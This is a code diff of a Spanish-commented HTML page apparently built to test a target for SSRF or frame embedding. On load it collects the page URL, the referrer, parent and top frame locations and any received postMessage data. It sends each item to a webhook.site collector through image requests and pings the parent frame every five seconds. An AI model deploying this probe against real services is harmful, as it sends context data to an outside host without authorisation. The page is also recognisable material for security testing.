@@ -1,43 +1,105 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SSRF Test con iframe</title>
+    <title>SSRF Test</title>
+    <style>
+        #status {
+            padding: 10px;
+            border: 1px solid #ddd;
+            margin: 10px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+    </style>
 </head>
 <body>
-    <h1>SSRF Test</h1>
-    <div id="iframeContainer"></div>
-    <button id="loadIframe">Cargar iframe</button>
+    <div id="status"></div>
 
     <script>
         const webhookUrl = 'https://webhook.site/7cdc61db-d2f3-4e50-aab4-9744f57a2a32';
-        
-        document.getElementById('loadIframe').addEventListener('click', function() {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';  // Ocultar el iframe
-            iframe.src = webhookUrl + '?source=iframe&time=' + Date.now();
+        const statusDiv = document.getElementById('status');
+
+        function logStatus(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            console.log(`[${timestamp}] ${message}`);
+            statusDiv.innerHTML += `[${timestamp}] ${message}<br>`;
             
-            iframe.onload = function() {
-                console.log('iframe cargado exitosamente');
-                // Intenta acceder al contenido del iframe (esto fallará si no es del mismo origen)
-                try {
-                    console.log(iframe.contentDocument);
-                } catch (e) {
-                    console.log('No se puede acceder al contenido del iframe debido a la política del mismo origen');
+            // Intentar enviar al webhook
+            const img = new Image();
+            img.src = `${webhookUrl}?message=${encodeURIComponent(message)}&time=${Date.now()}`;
+        }
+
+        // Función para obtener información del contexto
+        function getContextInfo() {
+            try {
+                return {
+                    href: window.location.href,
+                    parent: window.parent !== window,
+                    top: window.top !== window,
+                    referrer: document.referrer,
+                    parentOrigin: window.parent.location.origin,
+                    parentHref: window.parent.location.href
+                };
+            } catch (e) {
+                return {
+                    error: e.message,
+                    href: window.location.href,
+                    parent: window.parent !== window,
+                    top: window.top !== window,
+                    referrer: document.referrer
+                };
+            }
+        }
+
+        // Al cargar la página
+        window.onload = function() {
+            const contextInfo = getContextInfo();
+            logStatus('Página cargada. Información del contexto: ' + JSON.stringify(contextInfo));
+
+            // Intentar acceder al padre
+            try {
+                if (window.parent) {
+                    logStatus('Acceso al padre detectado');
+                    // Intentar acceder a la ubicación del padre
+                    const parentLocation = window.parent.location.href;
+                    logStatus('URL del padre: ' + parentLocation);
                 }
-            };
-            
-            iframe.onerror = function() {
-                console.log('Error al cargar el iframe');
-            };
-            
-            document.getElementById('iframeContainer').appendChild(iframe);
-        });
-        
-        // Intento adicional con Image para comparación
-        const img = new Image();
-        img.onload = () => console.log('Imagen cargada exitosamente');
-        img.onerror = () => console.log('Error al cargar la imagen (esto es normal)');
-        img.src = webhookUrl + '?source=img_tag&time=' + Date.now();
+            } catch (e) {
+                logStatus('Error al acceder al padre: ' + e.message);
+            }
+
+            // Intentar acceder al top
+            try {
+                if (window.top) {
+                    logStatus('Acceso al top detectado');
+                    // Intentar acceder a la ubicación del top
+                    const topLocation = window.top.location.href;
+                    logStatus('URL del top: ' + topLocation);
+                }
+            } catch (e) {
+                logStatus('Error al acceder al top: ' + e.message);
+            }
+        };
+
+        // Escuchar mensajes
+        window.addEventListener('message', function(event) {
+            logStatus('Mensaje recibido de: ' + event.origin + ' - Datos: ' + JSON.stringify(event.data));
+        }, false);
+
+        // Monitorear errores
+        window.onerror = function(message, source, lineno, colno, error) {
+            logStatus('Error: ' + message + ' en ' + source + ':' + lineno);
+        };
+
+        // Intentar enviar mensajes periódicamente
+        setInterval(() => {
+            try {
+                window.parent.postMessage('ping desde iframe', '*');
+                logStatus('Mensaje enviado al padre');
+            } catch (e) {
+                logStatus('Error al enviar mensaje: ' + e.message);
+            }
+        }, 5000);
     </script>
 </body>
 </html>
